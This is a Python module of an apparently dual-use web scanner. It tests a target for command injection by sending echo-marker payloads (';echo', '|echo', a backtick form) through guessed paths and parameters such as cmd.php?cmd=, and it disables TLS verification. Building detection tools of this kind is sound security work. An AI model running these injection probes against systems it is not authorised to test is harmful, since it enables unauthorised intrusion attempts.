import os
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from r_ascan.config import HTTP_HEADERS, DEFAULT_TIMEOUT
from r_ascan.module.other import Other


class RCEScanner:
    def __init__(self, args):
        self.target = f"{args.target}:{args.port}" if args.port else args.target
        self.threads = args.threads
        self.verbose = args.verbose
        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
        self.printer = Other()

        self.payloads = {
            ";echo rce_test_123": "rce_test_123",
            "|echo rce_test_456": "rce_test_456",
            "`echo rce_test_789`": "rce_test_789"
        }

        self.common_params = ["cmd", "exec", "run", "query", "input"]
        self.guess_paths = ["", "exec", "run", "shell", "system", "execute", "cmd",
                            "exec.php", "run.php", "shell.php", "cmd.php"]

    def build_urls(self):
        urls = []
        for proto in ["http", "https"]:
            for path in self.guess_paths:
                base = f"{proto}://{self.target}"
                if path:
                    base += f"/{path}"
                for param in self.common_params:
                    for payload, marker in self.payloads.items():
                        full_url = f"{base}?{param}={payload}"
                        urls.append((full_url, marker, payload))
        return urls

    def check_rce(self, url, marker, payload):
        try:
            resp = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
            if resp.status_code == 200 and marker in resp.text:
                return {"url": url, "marker": marker, "payload": payload}
            if self.verbose:
                self.print_status("Not Vuln", url, level="-")
        except Exception as e:
            if self.verbose:
                self.print_error("Error checking", url, e)
        return None

    def print_status(self, status, url, level="*"):
        colored_module = self.printer.color_text(self.module_name, "cyan")
        colored_url = self.printer.color_text(url, "yellow")
        color = "green" if status.lower() == "vuln" else "red"
        status_colored = self.printer.color_text(status, color)
        print(f"[{level}] [Module: {colored_module}] [{status_colored}] {colored_url}")

    def print_error(self, msg, url, error):
        colored_module = self.printer.color_text(self.module_name, "cyan")
        colored_url = self.printer.color_text(url, "yellow")
        colored_error = self.printer.color_text(str(error), "red")
        print(f"[!] [Module: {colored_module}] {msg} {colored_url} - {colored_error}")

    def run(self):
        colored_module = self.printer.color_text(self.module_name, "cyan")
        print(f"[*] [Module: {colored_module}] Starting RCE scan on {self.target}")

        urls = self.build_urls()
        tasks = []
        results = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for url, marker, payload in urls:
                tasks.append(executor.submit(self.check_rce, url, marker, payload))

            for future in as_completed(tasks):
                result = future.result()
                if result:
                    self.print_status("Vuln", result["url"], level="+")
                    results.append({
                        "vulnerable": True,
                        "url": result["url"],
                        "payload": result["payload"],
                        "marker": result["marker"]
                    })
                    return results  # stop on first positive

        self.print_status("Not Vuln", "No RCE detected")
        return [{"vulnerable": False}]


def scan(args=None):
    return RCEScanner(args).run()
